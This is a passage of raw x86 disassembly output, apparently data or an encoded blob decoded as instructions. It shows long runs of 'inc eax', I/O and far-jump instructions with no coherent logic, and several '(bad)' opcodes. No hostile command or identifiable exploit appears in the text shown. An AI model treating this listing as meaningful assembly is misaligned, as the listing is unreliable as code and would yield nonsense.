  40ef5d:	bound  eax,QWORD PTR [ecx-0x71]
  40ef60:	in     al,dx
  40ef61:	inc    esp
  40ef62:	xor    BYTE PTR [ebx+eax*8],bl
  40ef65:	inc    eax
  40ef66:	inc    eax
  40ef67:	inc    eax
  40ef68:	inc    eax
  40ef69:	inc    eax
  40ef6a:	inc    eax
  40ef6b:	int3   
  40ef6c:	jne    0x40efae
  40ef6e:	sar    DWORD PTR [eax],1
  40ef70:	mov    ecx,0x62aa800f
  40ef75:	pop    ecx
  40ef76:	test   eax,0x212a5fff
  40ef7b:	cmp    DWORD PTR ds:0x41f84862,edi
  40ef81:	mov    ecx,0x9ee4cd41
  40ef86:	mov    WORD PTR [eax+0x43],fs
  40ef89:	push   ebx
  40ef8a:	sbb    BYTE PTR [eax+0x52],0x20
  40ef8e:	rol    DWORD PTR [eax+0x0],cl
  40ef91:	rol    DWORD PTR [eax+0x40],0x40
  40ef95:	inc    eax
  40ef96:	add    BYTE PTR [eax-0x76],al
  40ef99:	xor    BYTE PTR [edx],dl
  40ef9b:	and    al,0x91
  40ef9d:	fisub  WORD PTR [edx+0x63]
  40efa0:	ret    
  40efa1:	je     0x40ef5e
  40efa3:	sbb    al,0x6a
  40efa5:	jne    0x40eff8
  40efa7:	or     eax,0x81d447eb
  40efac:	jne    0x40ef56
  40efae:	cld    
  40efaf:	jnp    0x40efb0
  40efb1:	test   DWORD PTR [esi+0x3f91a140],ecx
  40efb7:	dec    esp
  40efb8:	pop    ss
  40efb9:	inc    eax
  40efba:	inc    eax
  40efbb:	inc    eax
  40efbc:	inc    eax
  40efbd:	inc    eax
  40efbe:	inc    eax
  40efbf:	inc    eax
  40efc0:	inc    eax
  40efc1:	inc    DWORD PTR [eax+0x60]
  40efc4:	test   BYTE PTR [eax+0xdf0bf97],0xab
  40efcb:	lock push eax
  40efcd:	sub    ecx,DWORD PTR [edi+0x40]
  40efd0:	arpl   bx,cx
  40efd2:	jl     0x40ef70
  40efd4:	xchg   edx,eax
  40efd5:	test   BYTE PTR [ecx+0x40],dl
  40efd8:	xor    bl,BYTE PTR [edx+0x34]
  40efdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efdc:	mov    al,ds:0x84411682
  40efe1:	aaa    
  40efe2:	inc    esp
  40efe3:	inc    ebx
  40efe4:	xchg   esp,eax
  40efe5:	in     eax,dx
  40efe6:	adc    esp,esp
  40efe8:	inc    eax
  40efe9:	inc    eax
  40efea:	inc    eax
  40efeb:	inc    eax
  40efec:	inc    eax
  40efed:	inc    eax
  40efee:	inc    eax
  40efef:	inc    eax
  40eff0:	inc    eax
  40eff1:	inc    eax
  40eff2:	bound  ecx,QWORD PTR [eax-0x6c]
  40eff5:	rol    BYTE PTR [ecx],cl
  40eff7:	outs   dx,BYTE PTR ds:[esi]
  40eff8:	jg     0x40f040
  40effa:	inc    edx
  40effb:	add    eax,0x4ae5453d
  40f000:	adc    bl,BYTE PTR [esp+edi*1]
  40f003:	jnp    0x40efc5
  40f005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f006:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f007:	adc    DWORD PTR [edi],0x404c002c
  40f00d:	inc    eax
  40f00e:	inc    eax
  40f00f:	inc    eax
  40f010:	inc    eax
  40f011:	inc    eax
  40f012:	inc    eax
  40f013:	inc    eax
  40f014:	add    BYTE PTR [eax+ebp*1-0x5c],ah
  40f018:	inc    eax
  40f019:	mov    esi,0x34057294
  40f01e:	sti    
  40f01f:	xchg   edi,eax
  40f020:	add    BYTE PTR [edx+edx*2+0x40404040],bh
  40f027:	inc    eax
  40f028:	inc    eax
  40f029:	and    eax,0x62404040
  40f02e:	retf   
  40f02f:	inc    edx
  40f030:	inc    ecx
  40f031:	or     BYTE PTR [edi-0x41],ch
  40f034:	test   al,0x55
  40f036:	push   esp
  40f037:	xchg   esp,eax
  40f038:	inc    ebx
  40f039:	mov    WORD PTR [edi+0x40],es
  40f03c:	adc    BYTE PTR [eax-0x41cfc2b5],dl
  40f042:	add    BYTE PTR [eax-0x6c],al
  40f045:	test   al,0x5f
  40f047:	shl    BYTE PTR [eax+0x40],0x40
  40f04b:	inc    eax
  40f04c:	inc    eax
  40f04d:	inc    eax
  40f04e:	inc    eax
  40f04f:	inc    eax
  40f050:	inc    eax
  40f051:	inc    eax
  40f052:	inc    eax
  40f053:	div    DWORD PTR [eax]
  40f055:	push   ecx
  40f056:	inc    edx
  40f057:	adc    esp,ebx
  40f059:	dec    esi
  40f05a:	inc    edi
  40f05b:	jmp    0x40f041
  40f05d:	je     0x40f066
  40f05f:	dec    eax
  40f060:	mov    dl,0x34
  40f062:	test   DWORD PTR [eax],ebx
  40f064:	add    dl,BYTE PTR [eax+0x413c4228]
  40f06a:	inc    ebx
  40f06b:	push   esi
  40f06c:	sub    BYTE PTR [esi-0x6b941cc0],ch
  40f072:	nop
  40f073:	xchg   esp,eax
  40f074:	sub    cl,BYTE PTR [edx]
  40f076:	mov    ebx,0x403d30ac
  40f07b:	inc    eax
  40f07c:	inc    eax
  40f07d:	inc    eax
  40f07e:	inc    eax
  40f07f:	inc    eax
  40f080:	rol    DWORD PTR [eax+0x40],0x41
  40f084:	xchg   BYTE PTR [eax],bh
  40f086:	inc    eax
  40f087:	add    eax,0x43c04764
  40f08c:	lds    eax,FWORD PTR [edx+0x309e86c8]
  40f092:	xchg   esp,eax
  40f093:	shl    DWORD PTR [edx-0x43cbbfda],1
  40f099:	inc    ebp
  40f09a:	add    eax,0x7e457fce
  40f09f:	mov    edx,0x73c88764
  40f0a4:	mov    BYTE PTR [edx],0x23
  40f0a7:	add    eax,0x404003
  40f0ac:	inc    eax
  40f0ad:	inc    eax
  40f0ae:	inc    eax
  40f0af:	inc    eax
  40f0b0:	inc    eax
  40f0b1:	inc    eax
  40f0b2:	stos   BYTE PTR es:[edi],al
  40f0b3:	mov    ecx,0x952801d8
  40f0b8:	xchg   BYTE PTR [eax-0x55],bh
  40f0bb:	add    eax,0x4146bdfc
  40f0c0:	and    eax,0x40cabf64
  40f0c5:	inc    eax
  40f0c6:	inc    eax
  40f0c7:	inc    eax
  40f0c8:	inc    eax
  40f0c9:	inc    eax
  40f0ca:	inc    eax
  40f0cb:	inc    eax
  40f0cc:	inc    eax
  40f0cd:	inc    eax
  40f0ce:	inc    ecx
  40f0cf:	and    al,0x81
  40f0d1:	pop    eax
  40f0d2:	mov    ecx,0x43acbfd6
  40f0d7:	pop    esi
  40f0d8:	jae    0x40f113
  40f0da:	add    eax,0x3049bda8
  40f0df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0e0:	adc    BYTE PTR [ecx-0x7a],0xbf
  40f0e4:	add    BYTE PTR [eax+0x6c],al
  40f0e7:	mov    ebx,0x2a29b17a
  40f0ec:	test   al,0x71
  40f0ee:	inc    edi
  40f0ef:	cwde   
  40f0f0:	xlat   BYTE PTR ds:[ebx]
  40f0f1:	push   0x404040b8
  40f0f6:	inc    eax
  40f0f7:	inc    eax
  40f0f8:	inc    eax
  40f0f9:	int3   
  40f0fa:	jne    0x40f13c
  40f0fc:	lods   al,BYTE PTR ds:[esi]
  40f0fd:	inc    edi
  40f0fe:	test   DWORD PTR fs:[ecx],ebp
  40f101:	add    dh,BYTE PTR [ebx+0x623dcb05]
  40f107:	inc    ebx
  40f108:	mov    al,ds:0x15865bed
  40f10d:	arpl   WORD PTR gs:[eax+0x35412e8b],dx
  40f114:	inc    esp
  40f115:	mov    eax,0x40c10040
  40f11a:	inc    eax
  40f11b:	inc    eax
  40f11c:	inc    eax
  40f11d:	add    BYTE PTR [eax+0x30],al
  40f120:	pop    esi
  40f121:	push   cs
  40f122:	push   ebp
  40f123:	shl    DWORD PTR [edi-0x57acc2fe],cl
  40f129:	into   
  40f12a:	add    DWORD PTR [esi-0x73cfffb],esi
  40f130:	inc    eax
  40f131:	sbb    BYTE PTR [eax-0xd],al
  40f134:	xchg   BYTE PTR [ecx+0x4c],dh
  40f137:	inc    ecx
  40f138:	sub    ah,BYTE PTR [esi+0x40404080]
  40f13e:	inc    eax
  40f13f:	inc    eax
  40f140:	inc    eax
  40f141:	inc    eax
  40f142:	inc    eax
  40f143:	inc    DWORD PTR [eax+0x4c]
  40f146:	adc    DWORD PTR [edx],ebx
  40f148:	ja     0x40f0eb
  40f14a:	inc    ebp
  40f14b:	or     DWORD PTR [esi],esp
  40f14d:	jb     0x40f105
  40f14f:	aam    0x20
  40f151:	ret    
  40f152:	sub    ch,BYTE PTR [ebp+0x62052349]
  40f158:	push   esi
  40f159:	mov    edx,0x40401ee0
  40f15e:	inc    eax
  40f15f:	inc    eax
  40f160:	inc    eax
  40f161:	inc    eax
  40f162:	inc    eax
  40f163:	inc    eax
  40f164:	inc    eax
  40f165:	inc    eax
  40f166:	add    BYTE PTR [ecx-0x7a],al
  40f169:	mov    eax,0xcab54149
  40f16e:	xor    dh,BYTE PTR [esi+0x6f]
  40f171:	add    eax,0xd0bc45e0
  40f176:	adc    al,BYTE PTR [ecx-0x4b]
  40f179:	adc    al,0x40
  40f17b:	inc    eax
  40f17c:	inc    eax
  40f17d:	inc    eax
  40f17e:	inc    eax
  40f17f:	inc    eax
  40f180:	inc    eax
  40f181:	inc    eax
  40f182:	add    BYTE PTR [eax+0x2c],ch
  40f185:	shl    DWORD PTR [ecx+eax*4],cl
  40f188:	jg     0x40f18f
  40f18a:	(bad)
  40f18f:	push   ebp
  40f190:	add    al,BYTE PTR [esi+0x4345ab62]
  40f196:	fwait
  40f197:	xchg   DWORD PTR [edi],edi
  40f199:	pusha  
  40f19a:	inc    eax
  40f19b:	or     BYTE PTR [eax+0x40406a30],bh
  40f1a1:	inc    eax
  40f1a2:	inc    eax
  40f1a3:	inc    eax
  40f1a4:	inc    eax
  40f1a5:	and    eax,0x2b404040
  40f1aa:	push   ebx
  40f1ab:	mov    ah,0xa0
  40f1ad:	out    0xc3,al
  40f1af:	mov    eax,0x59f7daa
  40f1b4:	and    ecx,ecx
  40f1b6:	test   BYTE PTR [edi+0x73],al
  40f1b9:	(bad)  
  40f1ba:	scas   eax,DWORD PTR es:[edi]
  40f1bb:	xchg   BYTE PTR [edx+0x44],ah
  40f1be:	add    eax,0x53c20e85
  40f1c3:	sub    al,0x55
  40f1c5:	aad    0x40
  40f1c7:	inc    eax
  40f1c8:	inc    eax
  40f1c9:	inc    eax
  40f1ca:	inc    eax
  40f1cb:	inc    eax
  40f1cc:	inc    eax
  40f1cd:	inc    eax
  40f1ce:	inc    eax
  40f1cf:	inc    eax
  40f1d0:	test   BYTE PTR [ebx-0x37],0x81
  40f1d4:	lahf   
  40f1d5:	mov    bl,0xc4
  40f1d7:	bound  ecx,QWORD PTR [edi-0x70]
  40f1da:	inc    eax
  40f1db:	rol    DWORD PTR ds:0x4f209005,cl
  40f1e1:	jnp    0x40f223
  40f1e3:	add    DWORD PTR [eax],esi
  40f1e5:	xchg   ah,bl
  40f1e7:	dec    ebp
  40f1e8:	adc    DWORD PTR [ebx+0x40],eax
  40f1eb:	jno    0x40f23d
  40f1ed:	sub    al,0x62
  40f1ef:	inc    ebx
  40f1f0:	enter  0x40d1,0x40
  40f1f4:	inc    eax
  40f1f5:	inc    eax
  40f1f6:	inc    eax
  40f1f7:	inc    eax
  40f1f8:	rol    DWORD PTR [eax+0x40],0xc
  40f1fc:	adc    eax,0xb034b20f
  40f201:	test   cl,dh
  40f203:	inc    eax
  40f204:	or     cl,BYTE PTR [esi+0x5]
  40f207:	inc    eax
  40f208:	or     eax,0x83121515
  40f20d:	lock xchg BYTE PTR [ebx+0x40],dl
  40f211:	inc    eax
  40f212:	add    BYTE PTR [eax+0x40],al
  40f215:	inc    eax
  40f216:	inc    eax
  40f217:	inc    eax
  40f218:	inc    eax
  40f219:	out    dx,eax
  40f21a:	retf   0x402d
  40f21d:	inc    eax
  40f21e:	add    DWORD PTR gs:[edx],esp
  40f221:	dec    edi
  40f222:	dec    esp
  40f223:	mov    BYTE PTR ds:0x3cb16d80,dl
  40f229:	inc    ebx
  40f22a:	dec    esp
  40f22b:	inc    ecx
  40f22c:	inc    eax
  40f22d:	sub    eax,0x41800537
  40f232:	xlat   BYTE PTR ds:[ebx]
  40f233:	inc    ebx
  40f234:	inc    eax
  40f235:	inc    eax
  40f236:	inc    eax
  40f237:	inc    eax
  40f238:	inc    eax
  40f239:	inc    eax
  40f23a:	inc    eax
  40f23b:	inc    eax
  40f23c:	inc    eax
  40f23d:	inc    eax
  40f23e:	outs   dx,BYTE PTR ds:[esi]
  40f23f:	inc    ebx
  40f240:	ins    DWORD PTR es:[edi],dx
  40f241:	xchg   ch,al
  40f243:	cmp    al,0x38
  40f245:	xor    BYTE PTR [eax-0x80],al
  40f248:	aas    
  40f249:	outs   dx,DWORD PTR ds:[esi]
  40f24a:	xchg   edx,eax
  40f24b:	aad    0x63
  40f24d:	mov    ah,0xe
  40f24f:	mov    ebp,0x4cbfb0eb
  40f254:	inc    edi
  40f255:	inc    eax
  40f256:	inc    eax
  40f257:	inc    eax
  40f258:	inc    eax
  40f259:	inc    eax
  40f25a:	inc    eax
  40f25b:	int3   
  40f25c:	jne    0x40f29e
  40f25e:	inc    edi
  40f25f:	inc    eax
  40f260:	xor    dl,BYTE PTR [ebp+eax*1+0x1c]
  40f264:	jae    0x40f206
  40f266:	test   DWORD PTR [edi],ecx
  40f268:	inc    eax
  40f269:	inc    DWORD PTR [esi-0x3effbfbd]
  40f26f:	inc    eax
  40f270:	inc    eax
  40f271:	inc    eax
  40f272:	inc    eax
  40f273:	add    BYTE PTR [eax+0x45],al
  40f276:	ret    
  40f277:	inc    ebx
  40f278:	inc    eax
  40f279:	add    BYTE PTR [eax+eiz*2+0x1f],dl
  40f27d:	out    0x83,eax
  40f27f:	nop
  40f280:	or     DWORD PTR [esi],esp
  40f282:	jmp    FWORD PTR [edi+0x183b5e5c]
  40f288:	inc    eax
  40f289:	or     dl,BYTE PTR [ebp+eax*1+0x62]
  40f28d:	test   eax,0x4040404e
  40f292:	inc    eax
  40f293:	inc    eax
  40f294:	inc    eax
  40f295:	inc    eax
  40f296:	inc    eax
  40f297:	inc    DWORD PTR [eax+0x43]
  40f29a:	adc    al,0x83
  40f29c:	inc    DWORD PTR [esi-0x2ef57eaa]
  40f2a2:	inc    eax
  40f2a3:	inc    ebx
  40f2a4:	push   esp
  40f2a5:	xor    ebp,DWORD PTR [ecx+0x40]
  40f2a8:	enter  0x30a,0x1
  40f2ac:	inc    eax
  40f2ad:	inc    eax
  40f2ae:	inc    eax
  40f2af:	inc    eax
  40f2b0:	inc    eax
  40f2b1:	inc    eax
  40f2b2:	inc    eax
  40f2b3:	inc    eax
  40f2b4:	inc    eax
  40f2b5:	inc    eax
  40f2b6:	jmp    FWORD PTR [esi-0x68b3fd58]
  40f2bc:	inc    eax
  40f2bd:	jl     0x40f252
  40f2bf:	add    eax,0xcd154475
  40f2c4:	adc    eax,0x40403483
  40f2c9:	inc    eax
  40f2ca:	inc    eax
  40f2cb:	inc    eax
  40f2cc:	inc    eax
  40f2cd:	inc    eax
  40f2ce:	inc    eax
  40f2cf:	add    BYTE PTR [esi+0x6acb84e7],al
  40f2d5:	inc    eax
  40f2d6:	inc    esi
  40f2d7:	es aaa 
  40f2d9:	bound  eax,QWORD PTR [ebx+eax*2+0x41]
  40f2dd:	adc    al,BYTE PTR [eax+0x5f5aad4b]
  40f2e3:	push   edx
  40f2e4:	inc    ebx
  40f2e5:	inc    eax
  40f2e6:	xor    esi,DWORD PTR [eax+0x14bc2a05]
  40f2ec:	xor    BYTE PTR [eax+0x40],al
  40f2ef:	inc    eax
  40f2f0:	inc    eax
  40f2f1:	inc    eax
  40f2f2:	inc    eax
  40f2f3:	and    eax,0x14404040
  40f2f8:	push   ds
  40f2f9:	mov    dh,0x86
  40f2fb:	adc    BYTE PTR [eax+ebp*2-0x50],dh
  40f2ff:	inc    eax
  40f300:	arpl   WORD PTR [edx+0x4d3dbc2f],di
  40f306:	inc    edi
  40f307:	adc    eax,DWORD PTR [edx]
  40f309:	push   edx
  40f30a:	lods   al,BYTE PTR ds:[esi]
  40f30b:	add    eax,0x40851049
  40f310:	test   eax,0x5acd0592
  40f315:	enter  0xe43,0x56
  40f319:	inc    eax
  40f31a:	inc    eax
  40f31b:	inc    eax
  40f31c:	inc    eax
  40f31d:	inc    eax
  40f31e:	inc    eax
  40f31f:	inc    eax
  40f320:	inc    eax
  40f321:	inc    eax
  40f322:	inc    eax
  40f323:	sub    eax,DWORD PTR [esi-0x6fb397bc]
  40f329:	inc    eax
  40f32a:	adc    BYTE PTR [edi+0x24],0x2a
  40f32e:	inc    ebx
  40f32f:	add    eax,0x31290935
  40f334:	stos   DWORD PTR es:[edi],eax
  40f335:	inc    eax
  40f336:	adc    al,0xcb
  40f338:	inc    ebx
  40f339:	inc    eax
  40f33a:	imul   eax,DWORD PTR [eax+0x40],0x40
  40f33e:	inc    eax
  40f33f:	inc    eax
  40f340:	inc    eax
  40f341:	rol    DWORD PTR [eax+0x40],0x42
  40f345:	add    eax,0xd146672a
  40f34a:	pop    ds
  40f34b:	add    DWORD PTR [ebx],edx
  40f34d:	xchg   BYTE PTR [edi+0x59],al
  40f350:	mov    edx,0x52794069
  40f355:	and    DWORD PTR [esi-0x30],esi
  40f358:	and    DWORD PTR [eax+0x40908014],0x40400040
  40f362:	inc    eax
  40f363:	inc    eax
  40f364:	inc    eax
  40f365:	inc    eax
  40f366:	stos   BYTE PTR es:[edi],al
  40f367:	fs retf 
  40f369:	mov    esi,0x252440f7
  40f36e:	add    eax,0xcb474f65
  40f373:	adc    BYTE PTR ds:0x96038642,al
  40f379:	push   edi
  40f37a:	inc    ecx
  40f37b:	inc    eax
  40f37c:	add    al,0xbf
  40f37e:	sub    BYTE PTR [eax+0x40],al
  40f381:	inc    eax
  40f382:	inc    eax
  40f383:	inc    eax
  40f384:	inc    eax
  40f385:	inc    eax
  40f386:	inc    eax
  40f387:	inc    eax
  40f388:	inc    eax
  40f389:	mov    esp,0x194320da
  40f38e:	in     eax,dx
  40f38f:	dec    ecx
  40f390:	test   eax,0x30085c66
  40f395:	inc    eax
  40f396:	sub    al,0x93
  40f398:	add    eax,0xacfae853
  40f39d:	adc    ch,BYTE PTR [edx-0x5]
  40f3a0:	xchg   BYTE PTR [eax+eiz*2-0x7ebfb8db],bh
  40f3a7:	inc    eax
  40f3a8:	inc    eax
  40f3a9:	inc    eax
  40f3aa:	inc    eax
  40f3ab:	inc    eax
  40f3ac:	inc    eax
  40f3ad:	int3   
  40f3ae:	jne    0x40f3f0
  40f3b0:	inc    edx
  40f3b1:	adc    edi,DWORD PTR [edi-0x40]
  40f3b4:	dec    esp
  40f3b5:	test   DWORD PTR [ebx],eax
  40f3b7:	jp     0x40f3ee
  40f3b9:	test   al,0x70
  40f3bb:	leave  
  40f3bc:	add    eax,0x44014043
  40f3c1:	add    eax,0x90cbbc64
  40f3c6:	add    eax,0xc1004043
  40f3cb:	inc    eax
  40f3cc:	inc    eax
  40f3cd:	inc    eax
  40f3ce:	inc    eax
  40f3cf:	add    BYTE PTR [eax+0x11],al
  40f3d2:	xchg   BYTE PTR [eax+0x40d2ac37],al
  40f3d8:	add    BYTE PTR [ebx+0x60],0x73
  40f3dc:	call   0x4040:0x40404041
  40f3e3:	inc    eax
  40f3e4:	inc    eax
  40f3e5:	inc    eax
  40f3e6:	inc    DWORD PTR [eax+0x43]
  40f3e9:	add    al,0x34
  40f3eb:	shl    DWORD PTR [edi-0x2e959cbe],cl
  40f3f1:	inc    eax
  40f3f2:	dec    edi
  40f3f3:	inc    edx
  40f3f4:	add    eax,0x94c86041
  40f3f9:	inc    eax
  40f3fa:	add    BYTE PTR [ecx+0x63d43b86],dh
  40f400:	int3   
  40f401:	inc    eax
  40f402:	sub    eax,0x40404040
  40f407:	inc    eax
  40f408:	inc    eax
  40f409:	inc    eax
  40f40a:	inc    eax
  40f40b:	inc    eax
  40f40c:	inc    eax
  40f40d:	push   eax
  40f40e:	and    eax,0xca524047
  40f413:	inc    eax
  40f414:	inc    eax
  40f415:	mov    edi,0x9840f803
  40f41a:	test   DWORD PTR [eax+0x34],eax
  40f41d:	inc    eax
  40f41e:	inc    eax
  40f41f:	inc    edi
  40f420:	inc    eax
  40f421:	inc    eax
  40f422:	inc    eax
  40f423:	inc    eax
  40f424:	inc    eax
  40f425:	inc    eax
  40f426:	inc    eax
  40f427:	inc    eax
  40f428:	add    BYTE PTR [ebx+0x67],dl
  40f42b:	inc    ecx
  40f42c:	or     al,0x32
  40f42e:	xor    ebx,DWORD PTR [ebp+esi*1+0x40434277]
  40f435:	or     BYTE PTR [edi+0x68],dh
  40f438:	inc    ebx
  40f439:	mov    esp,0x810d30d6
  40f43e:	inc    eax
  40f43f:	inc    eax
  40f440:	inc    eax
  40f441:	inc    eax
  40f442:	inc    eax
  40f443:	inc    eax
  40f444:	and    eax,0x9b404040
  40f449:	arpl   WORD PTR [edx+0x42],ax
  40f44c:	cmp    DWORD PTR [eax+0x5836140],ebp
  40f452:	dec    eax
  40f453:	sbb    DWORD PTR [ebx],ebx
  40f455:	inc    edi
  40f456:	adc    al,0x0
  40f458:	mov    ah,0x86
  40f45a:	les    edi,FWORD PTR [eax+edi*2-0x7b]
  40f45e:	inc    eax
  40f45f:	sub    DWORD PTR [edi+0x62415125],edi
  40f465:	inc    ebx
  40f466:	or     BYTE PTR [ebp+0x68],ch
  40f469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f46a:	inc    eax
  40f46b:	inc    eax
  40f46c:	inc    eax
  40f46d:	inc    eax
  40f46e:	inc    eax
  40f46f:	inc    eax
  40f470:	inc    eax
  40f471:	inc    eax
  40f472:	inc    eax
  40f473:	inc    eax
  40f474:	inc    ecx
  40f475:	push   eax
  40f476:	daa    
  40f477:	nop
  40f478:	inc    eax
  40f479:	add    ah,BYTE PTR ds:0x35eb3905
  40f47f:	out    dx,eax
  40f480:	outs   dx,BYTE PTR ds:[esi]
  40f481:	sub    DWORD PTR [ebx-0x7a],esi
  40f484:	inc    esi
  40f485:	pusha  
  40f486:	stc    
  40f487:	inc    ebx
  40f488:	inc    eax
  40f489:	inc    eax
  40f48a:	inc    eax
  40f48b:	inc    eax
  40f48c:	inc    eax
  40f48d:	inc    eax
  40f48e:	rol    DWORD PTR [eax+0x40],0x40
  40f492:	dec    ebx
  40f493:	inc    esp
  40f494:	sub    al,0xf8
  40f496:	bound  edx,QWORD PTR [edx-0x3333f12f]
  40f49c:	int3   
  40f49d:	int3   
  40f49e:	int3   
  40f49f:	int3   
  40f4a0:	add    BYTE PTR [eax-0x5d],dh
  40f4a3:	dec    ecx
  40f4a4:	inc    esi
  40f4a5:	xor    BYTE PTR [ecx],bl
  40f4a7:	inc    eax
  40f4a8:	push   ss
  40f4a9:	add    eax,DWORD PTR ds:0x3c353435
  40f4af:	cvtpi2ps xmm0,QWORD PTR [ecx+0x40]
  40f4b3:	inc    eax
  40f4b4:	add    BYTE PTR [eax+0x40],al
  40f4b7:	inc    eax
  40f4b8:	inc    eax
  40f4b9:	inc    eax
  40f4ba:	inc    eax
  40f4bb:	xchg   BYTE PTR [edx+0xc],al
  40f4be:	inc    esp
  40f4bf:	jmp    0x1e42:0x25d10b40
  40f4c6:	mov    eax,0x4e9e09c7
  40f4cb:	mov    ds:0x41c35348,al
  40f4d0:	inc    eax
  40f4d1:	outs   dx,BYTE PTR ds:[esi]
  40f4d2:	xor    eax,DWORD PTR ds:0x40404040
  40f4d8:	inc    eax
  40f4d9:	inc    eax
  40f4da:	inc    eax
  40f4db:	inc    eax
  40f4dc:	inc    eax
  40f4dd:	inc    eax
  40f4de:	les    edx,FWORD PTR [edx+0x401443b6]
  40f4e4:	dec    esi
  40f4e5:	xchg   BYTE PTR [eax+0x7a],ah
  40f4e8:	add    eax,0x3f004030
  40f4ed:	add    al,0x40
  40f4ef:	inc    eax
  40f4f0:	inc    eax
  40f4f1:	inc    eax
  40f4f2:	inc    eax
  40f4f3:	inc    eax
  40f4f4:	int3   
  40f4f5:	jne    0x40f537
  40f4f7:	inc    esp
  40f4f8:	sub    esi,esi
  40f4fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4fb:	add    ebp,DWORD PTR [esi+ecx*2]
  40f4fe:	mov    eax,ds:0x474f622d
  40f503:	inc    eax
  40f504:	push   esp
  40f505:	rol    DWORD PTR ds:0x8539d445,cl
  40f50b:	adc    eax,0xc1004080
  40f510:	inc    eax
  40f511:	inc    eax
  40f512:	inc    eax
  40f513:	inc    eax
  40f514:	add    BYTE PTR [eax+0x2f],al
  40f517:	xchg   BYTE PTR [esi+0x43],al
  40f51a:	xor    al,0x43
  40f51c:	inc    eax
  40f51d:	pop    ss
  40f51e:	dec    esi
  40f51f:	pusha  
  40f520:	mov    ecx,eax
  40f522:	dec    eax
  40f523:	nop
  40f524:	adc    bl,BYTE PTR [ebx-0x21]
  40f527:	mov    al,ds:0x8c3a3b6b
  40f52c:	inc    eax
  40f52d:	mov    BYTE PTR [eax+0x40],al
  40f530:	inc    eax
  40f531:	inc    eax
  40f532:	inc    eax
  40f533:	inc    eax
  40f534:	inc    eax
  40f535:	inc    eax
  40f536:	inc    DWORD PTR [eax+0x4e]
  40f539:	add    eax,0x439c43ab
  40f53e:	adc    al,0x3
  40f540:	fild   WORD PTR [esi-0x2e463e91]
  40f546:	inc    eax
  40f547:	jmp    0x740d:0xf8ab2574
  40f54e:	adc    eax,DWORD PTR [edi+edx*8-0x61]
  40f552:	inc    ecx
  40f553:	xor    al,cl
  40f555:	inc    edx
  40f556:	inc    eax
  40f557:	add    BYTE PTR [edi+0x5],cl
  40f55a:	aad    0x62
  40f55c:	inc    eax
  40f55d:	inc    eax
  40f55e:	inc    eax
  40f55f:	inc    eax
  40f560:	inc    eax
  40f561:	inc    eax
  40f562:	inc    eax
  40f563:	inc    eax
  40f564:	inc    eax
  40f565:	inc    eax
  40f566:	mov    eax,ds:0xff2c0eb0
  40f56b:	xchg   BYTE PTR [esp+eiz*2],ch
  40f56e:	nop
  40f56f:	jle    0x40f5b1
  40f571:	push   esp
  40f572:	pop    eax
  40f573:	cmp    BYTE PTR [edx-0x6f],ah
  40f576:	mov    ecx,0xf3010941
  40f57b:	sahf   
  40f57c:	inc    eax
  40f57d:	inc    eax
  40f57e:	inc    eax
  40f57f:	inc    eax
  40f580:	inc    eax
  40f581:	inc    eax
  40f582:	inc    eax
  40f583:	inc    eax
  40f584:	add    BYTE PTR [esi+0x63],al
  40f587:	or     eax,0x59674043
  40f58c:	add    eax,0x30ca0c88
  40f591:	pop    ds
  40f592:	add    DWORD PTR [ecx-0x7a],esi
  40f595:	jp     0x40f5af
  40f597:	dec    eax
  40f598:	mov    al,ds:0x25405540
  40f59d:	xor    eax,0x14473562
  40f5a2:	add    DWORD PTR [eax-0x63],edx
  40f5a5:	inc    esi
  40f5a6:	inc    eax
  40f5a7:	inc    eax
  40f5a8:	inc    eax
  40f5a9:	inc    eax
  40f5aa:	inc    eax
  40f5ab:	inc    eax
  40f5ac:	and    eax,0xd0404040
  40f5b1:	inc    edi
  40f5b2:	test   DWORD PTR [eax+0x44],eax
  40f5b5:	jns    0x40f5bc
  40f5b7:	mov    eax,0x10604643
  40f5bc:	cmp    DWORD PTR [esi-0x7fdac27a],0x404040f0
  40f5c6:	inc    eax
  40f5c7:	inc    eax
  40f5c8:	inc    eax
  40f5c9:	inc    eax
  40f5ca:	inc    eax
  40f5cb:	inc    eax
  40f5cc:	inc    eax
  40f5cd:	inc    eax
  40f5ce:	push   0xd4c36e58
  40f5d3:	inc    ebx
  40f5d4:	popf   
  40f5d5:	sbb    DWORD PTR [eax+0x7f009c71],eax
  40f5db:	sub    BYTE PTR [ecx+0x5582440],ch
  40f5e1:	stos   DWORD PTR es:[edi],eax
  40f5e2:	ins    DWORD PTR es:[edi],dx
  40f5e3:	inc    eax
  40f5e4:	inc    eax
  40f5e5:	inc    eax
  40f5e6:	inc    eax
  40f5e7:	inc    eax
  40f5e8:	inc    eax
  40f5e9:	rol    DWORD PTR [eax+0x40],0x55
  40f5ed:	test   al,0x12
  40f5ef:	(bad)  
  40f5f0:	sti    
  40f5f1:	xchg   BYTE PTR [ebx+eiz*2],al
  40f5f4:	stos   DWORD PTR es:[edi],eax
  40f5f5:	inc    eax
  40f5f6:	inc    eax
  40f5f7:	dec    eax
  40f5f8:	sub    ch,BYTE PTR [esi]
  40f5fa:	inc    esi
  40f5fb:	ja     0x40f63e
  40f5fd:	inc    eax
  40f5fe:	inc    eax
  40f5ff:	add    BYTE PTR [eax+0x40],al
  40f602:	inc    eax
  40f603:	inc    eax
  40f604:	inc    eax
  40f605:	inc    eax
  40f606:	sub    al,BYTE PTR [ebx]
  40f608:	adc    ecx,0xb9189e9b
  40f60e:	dec    ebx
  40f60f:	inc    eax
  40f610:	ss pop esp
  40f612:	add    eax,0x2a05094c
  40f617:	add    eax,0x62863002
  40f61c:	push   esp
  40f61d:	xchg   ch,dl
  40f61f:	inc    eax
  40f620:	and    DWORD PTR [ecx+ebp*1],ebp
  40f623:	inc    ebx
  40f624:	outs   dx,DWORD PTR ds:[esi]
  40f625:	pop    ebx
  40f626:	inc    eax
  40f627:	inc    eax
  40f628:	inc    eax
  40f629:	inc    eax
  40f62a:	inc    eax
  40f62b:	inc    eax
  40f62c:	inc    eax
  40f62d:	inc    eax
  40f62e:	inc    eax
  40f62f:	inc    eax
  40f630:	jae    0x40f636
  40f632:	pusha  
  40f633:	sub    DWORD PTR [edx-0x6d541f08],ebx
  40f639:	inc    eax
  40f63a:	pop    ecx
  40f63b:	xchg   edx,eax
